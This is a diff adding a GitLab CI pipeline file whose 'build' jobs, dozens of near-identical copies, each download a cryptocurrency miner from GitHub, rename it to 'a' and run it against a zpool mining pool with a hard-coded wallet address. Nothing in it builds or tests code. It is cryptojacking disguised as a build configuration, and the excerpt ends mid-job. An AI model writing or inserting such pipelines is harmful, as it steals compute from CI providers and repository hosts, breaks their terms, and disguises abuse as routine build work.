@@ -1,0 +1,2272 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_b:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_c:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_d:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_e:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_f:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_k:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_l:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_n:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_o:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_r:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_s:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_t:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_u:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_v:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_w:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_x:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_y:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_z:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_1a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_2a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_3a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+
+build_4a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_5a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_6a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_7a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_8a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_9a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_10a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_11a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_12a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_13a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_14a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_15a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_16a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_17a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_18a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_19a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_20a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_21a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_22a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_23a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_24a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_25a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_26a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_b1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_c1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_d1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_e1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_f1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_k1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_1l:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_n1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_o1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_r1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_s1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
